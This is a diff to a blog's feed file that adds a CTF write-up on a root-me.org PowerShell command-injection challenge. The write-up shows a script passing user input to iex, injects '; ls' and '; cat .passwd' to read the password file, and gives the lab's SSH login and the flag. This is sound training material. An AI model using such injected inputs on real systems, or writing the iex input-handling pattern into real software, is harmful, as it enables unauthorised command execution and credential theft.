@@ -12,6 +12,200 @@
     </author>
     
       <item>
+        <title>Powershell - Command Injection - root-me.org</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;In this write-up, we’re taking a different route by tackling a Windows machine CTF. This CTF is hosted at &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt; in the App Script tab. It is also ranked as easy! Let’s see what we have.&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
+
+&lt;p&gt;The ‘Statement’ says:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Statement&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Recover the database’s password.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A cryptic task, indeed! It seems we need to ssh into the machine to take a look and understand what this CTF is about. However, before doing so, let’s brush up on Powershell and command injection to sharpen our strategic approach mindset.&lt;/p&gt;
+
+&lt;p&gt;To ssh into the machine, we run the command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2225 app-script-ch18@challenge05.root-me.org&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch18&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
+
+&lt;h3 id=&quot;powershell-101&quot;&gt;Powershell 101&lt;/h3&gt;
+
+&lt;p&gt;Firstly, let’s discuss Powershell. Powershell serves as a Windows shell, akin to how Bash functions in Linux (or MacOS). Succeeding the older ‘CMD’ shell, Powershell can be seen as an enhanced version of CMD, offering a more robust feature set.&lt;/p&gt;
+
+&lt;p&gt;In Powershell, numerous commands are similar to those in CMD, but it also introduces a plethora of new ones exclusive to it. For example, commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt; are integrated from the Bash into Powershell.&lt;/p&gt;
+
+&lt;p&gt;For a simplistic introduction, this should suffice. However, if you are interested in how to level you Powershell game up, check it out &lt;a href=&quot;https://github.com/lllife-uncat/powershell-101/blob/master/PG_PowerShell_XWIPSCRE01_0.pdf&quot;&gt;this&lt;/a&gt; github repository. It contains a PDF full of insights on how to succeed using this shell!&lt;/p&gt;
+
+&lt;h3 id=&quot;command-injection&quot;&gt;Command injection&lt;/h3&gt;
+
+&lt;p&gt;Command injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS). Put in simple terms, a command injection vulnerability is one that the attacker disrupts the normal flow of a script, injecting arbitrary - usually not intended by the developer - code. This form of attack is distinct from other types of code injection, as it specifically targets command execution within an operating system’s environment.&lt;/p&gt;
+
+&lt;p&gt;For a good reference, check it out the OWASP command injection &lt;a href=&quot;https://owasp.org/www-community/attacks/Command_Injection&quot;&gt;page&lt;/a&gt;. It demonstrates how this usually happens within a Unix environment.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
+
+&lt;p&gt;Now that we’ve grasped the basic concepts that this challenge is involved with, let’s ssh into the machine and take a look around. Remember, this is a Powershell machine, so be comfortable working with Windows shell commands.&lt;/p&gt;
+
+&lt;p&gt;Here’s the greeting we receive upon sshing:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2225 app-script-ch18@challenge05.root-me.org
+      _           _ _                        ___  ____  
+  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; ___| 
+ / __| &lt;span class=&quot;s1&quot;&gt;&apos;_ \ / _` | | |/ _ \ &apos;&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | |___ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;
+| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | |  __/ | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| |  __/ |_| |___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_|_|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, |&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/|____/ 
+                                 |___/ root-me.org      
+
+app-script-ch18@challenge05.root-me.org&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
+Table to dump:
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This interface suggests that we are interacting with a command line program or script, rather than being directly in the shell environment. Let’s type any command to see what happens:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
+ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
+NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
+QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
+A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;Table to dump:
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alright, we are indeed inside a command line interface. We are not able to run Powershell commands, but since the problem says we have command injection, we might need to break this interface and access the shell. This is our goal!&lt;/p&gt;
+
+&lt;h3 id=&quot;context&quot;&gt;Context&lt;/h3&gt;
+
+&lt;p&gt;This command line interface might be something like this, in powershell:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Simulate-Interaction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
+ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
+NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
+QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
+A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Simulate-Interaction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To simulate it, let’s run a built-in PS shell inside our Linux environment:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /tmp/root-me&amp;gt; ./ps-ci.ps1
+Table to dump:
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; : &lt;span class=&quot;nb&quot;&gt;test
+&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
+ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
+NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
+QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
+A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yep. That looks almost the same as the CTF. See, a command injection vulnerability happens when our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$input&lt;/code&gt; variable breaks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Write-Host&lt;/code&gt; command and runs another on instead. In our code, however, that is not possible, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Write-Host&lt;/code&gt; is not prone to command injection. However, we can think that the script flow is similar to this one. To break out the string, we would use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe in Powershell, which is the same as saying: hey PS, besides what you need to run, do also run the following command as well. Here’s an example:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /tmp/root-me&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;kaizen
+cinjection  cinjection.c  ps  ps-ci.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
+
+&lt;p&gt;We have basically crafted our attack in the last step. The idea here is to break the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$input&lt;/code&gt; that the CTF Powershell script takes with a semi-colon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; and pass a PS command afterwards. So, the initial attack would be: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; ls&lt;/code&gt; for example.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
+
+&lt;p&gt;Let’s try it out:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
+AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
+YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
+AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
+AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table
+
+
+    Directory: C:&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;ygwin64&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;hallenge&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp-script&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;h18
+
+
+Mode                LastWriteTime         Length Name
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       12/12/2021   9:25 AM             43 .git
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       11/21/2021  11:34 AM            150 .key
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        4/20/2020  10:50 AM             18 .passwd
+&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       12/12/2021   9:50 AM            574 ._perms
+&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       11/21/2021  11:35 AM            348 ch18.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aha! As expected, we could break the input by passing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe with another command. Out of curiosity, let’s take a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch18.ps1&lt;/code&gt; script by injecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat ch18.ps1&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Conv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ertFrom-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump: &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoNewLine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Write-Host Connect to the database With the secure Password: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+. Backup the table &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Amazing. It is using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iex&lt;/code&gt; CMDlet, which is the short for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-Expression&lt;/code&gt; method used for executing code. That is why the subtitle of this CTF is “There’s UI, UX and IEX” xD&lt;/p&gt;
+
+&lt;p&gt;To solve this problem, we simply pass the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat .passwd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .passwd
+Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
+AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
+YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
+AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
+AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table
+SecureIEXpassword
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And there we have it! The flag for this CTF is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecureIEXpassword&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we learned a bit more about Powershell and command injection. The task was straightforward – to recover a database password within a Windows environment.&lt;/p&gt;
+
+&lt;p&gt;We first revised some Powershell concepts, as well as the definition of command injection attacks. The CTF setup led us to leverage the semicolon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; in Powershell to append and execute additional commands. By applying this technique, we successfully injected command within the environment.&lt;/p&gt;
+
+&lt;p&gt;As we can see, this is a simple Powershell CTF. By keeping our approach mindset, it was not difficult to find a way out to catch this flag!&lt;/p&gt;
+
+&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//powershell-command-injection-root-me</link>
+        <link href="http://localhost:4000/powershell-command-injection-root-me"/>
+        <guid isPermaLink="true">http://localhost:4000/powershell-command-injection-root-me</guid>
+      </item>
+    
+      <item>
         <title>Bash - System 2 - root-me.org</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
